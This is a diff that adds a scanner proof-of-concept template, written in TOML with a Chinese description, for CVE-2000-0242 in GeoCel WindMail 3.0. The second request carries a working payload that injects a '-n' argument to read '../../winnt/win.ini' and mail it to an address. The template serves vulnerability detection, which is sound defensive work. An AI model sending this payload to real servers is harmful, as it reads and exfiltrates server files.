@@ -1,0 +1,48 @@
+[info]
+author = "AVE"
+description = "通过发送包含 -n 参数的 GET 请求至 windmail.exe CGI 脚本，检测目标是否存在远程文件读取漏洞。攻击者可利用该漏洞读取 Web 服务器可访问的任何 ASCII 文件并通过邮件外传。"
+id = "POC-AVE-2000-0220"
+name = "GeoCel WindMail 3.0 Remote File Read PoC"
+severity = "medium"
+tags = ["ave-2000-0220"]
+vuln_id = [
+    "CVE-2000-0242",
+    "AVE-2000-0220",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/windmail.exe"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/windmail.exe?%20-n%20../../winnt/win.ini%20test@test.com"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+]
+type = "status"
